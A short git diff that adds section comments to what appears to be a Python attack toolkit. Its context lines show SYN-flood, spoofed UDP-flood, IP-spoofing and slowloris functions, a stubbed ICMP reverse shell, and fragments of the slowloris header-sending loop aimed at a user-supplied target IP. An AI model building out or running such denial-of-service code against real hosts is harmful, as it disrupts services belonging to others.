@@ -6,7 +6,7 @@ import urllib.request
 from ipaddress import IPv4Network
 from tqdm import tqdm
 
-
+#RECON
 def os_detection():
     print("Insert target IP address: ")
     target = input()
@@ -97,6 +97,8 @@ def ip_spoof():
     print("Click enter to continue...")
     input()
 
+
+#DOS
 def syn_flood():
     print("Insert target IP address: ")
     target = input()
@@ -213,6 +215,8 @@ def spoofed_udp_flood():
     t3.start()
     t4.start()
 
+
+#EXPLOITS
 def icmp_reverse_shell():
     return 0
 
@@ -232,6 +236,7 @@ def slow_loris():
         socket.send("User-Agent: {}\r\n".format(random.randint(0, 2000)).encode("utf-8"))
         socket.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
 
+#MENU
 def choose_recon():
     #clear the screen
     os.system("clear")
@@ -346,6 +351,7 @@ def choose_exploit():
         print("Invalid choice. Try again.")
         choose_exploit()
 
+#MAIN
 def main():
     os.system("clear")
     while True:
